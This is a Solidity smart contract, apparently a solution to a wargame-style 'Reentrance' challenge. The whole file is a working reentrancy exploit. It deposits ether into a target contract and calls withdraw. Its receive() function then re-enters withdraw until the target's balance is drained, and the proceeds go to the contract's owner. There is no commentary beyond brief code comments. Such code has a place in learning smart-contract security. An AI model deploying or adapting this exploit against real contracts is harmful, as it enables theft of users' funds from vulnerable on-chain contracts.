// SPDX-License-Identifier: UNLICENSED
pragma solidity >=0.8.4;

interface IReentrance {
    function donate(address _to) external payable;

    function balanceOf(address _who) external view returns (uint256 balance);

    function withdraw(uint256 _amount) external;
}

contract ReentranceAttacker {
    address payable private _owner;
    IReentrance private _target;
    uint256 private _amount;

    uint256 private _entered = 1;
    modifier reentrancy() {
        require(_entered == 1, 'reentrancy');
        _entered = 2;
        _;
        _entered = 1;
    }

    constructor() {
        _owner = payable(msg.sender);
    }

    receive() external payable {
        // we only need to perform the attack if we ourselves are receiving in reentrancy
        IReentrance target = _target;
        if (_entered == 2 && address(target) != address(0)) {
            uint256 targetBalance = address(target).balance;
            if (targetBalance > 0) {
                uint256 originalAmount = _amount;
                uint256 amount = targetBalance < originalAmount
                    ? targetBalance
                    : originalAmount;
                _target.withdraw(amount);
            }
        } else {
            // someone donated money?
            _sendEth(_owner, msg.value);
        }
    }

    // executes a reentrant attack
    function execute(IReentrance target) external payable reentrancy {
        require(msg.value > 0, 'need eth');

        // set state to be used during reentrancy
        _target = target;
        _amount = msg.value;

        // initiate the attack by depositing and withdrawing
        target.donate{ value: msg.value }(address(this));
        target.withdraw(msg.value);

        // clear the state
        _target = IReentrance(address(0));
        _amount = 0;

        // ship any balance to the owner
        uint256 balance = address(this).balance;
        require(balance > 0, 'no profit');
        _sendEth(_owner, balance);
    }

    function _sendEth(address payable to, uint256 amount)
        internal
        returns (bool sent)
    {
        // solhint-disable-next-line avoid-low-level-calls
        (sent, ) = to.call{ value: amount }('');
        require(sent, 'send eth failed');
    }
}
